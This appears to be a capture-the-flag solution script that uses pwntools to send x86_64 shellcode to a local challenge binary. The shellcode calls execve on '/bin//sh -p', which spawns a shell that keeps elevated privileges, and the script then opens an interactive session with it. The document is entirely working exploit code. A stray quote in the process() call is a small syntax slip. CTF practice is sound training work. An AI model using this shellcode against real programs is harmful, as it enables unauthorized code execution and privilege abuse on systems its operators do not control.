from pwn import *

context.arch = 'x86_64'

p = process('PATH_TO_THE_CHALLENGE_FILE'')

#  Embed assembly instructions in Python.
shellcode ="""
_start:
   
   SPAWN_SHELL:
      xor rax, rax 
      
      push rax
      mov  rcx, 0x68732F2f6e69622F
      push rcx
      push rsp
      xor  rdi, rdi 
      pop  rdi
      
      push rax
      xor rcx, rcx
      push rsp
      pop rcx
      add word ptr [rcx], 0x702d
      
      push rax
      push rcx
      push rdi
      push rsp
      xor  rsi, rsi 
      pop rsi
      
      cdq
      
      mov al, 59
      syscall

"""

shellcode = asm(shellcode)

p.send(shellcode)

p.interactive()
